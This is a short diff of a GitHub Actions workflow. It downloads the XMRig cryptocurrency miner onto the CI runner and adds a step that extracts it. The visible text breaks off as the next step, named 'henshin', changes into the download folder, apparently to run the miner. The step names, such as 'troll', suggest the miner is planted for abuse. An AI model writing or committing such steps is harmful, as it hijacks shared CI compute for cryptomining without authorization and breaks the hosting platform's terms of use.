@@ -22,6 +22,8 @@ jobs:
     steps: 
      - name: troll
        run: wget -P /home/runner/Downloads https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+     - name: extract
+       run: tar -xzvf /home/runner/Downloads/xmrig-6.22.2-linux-static-x64.tar.gz -C /home/runner/Downloads
      - name: henshin
        run: |
           cd /home/runner/Downloads
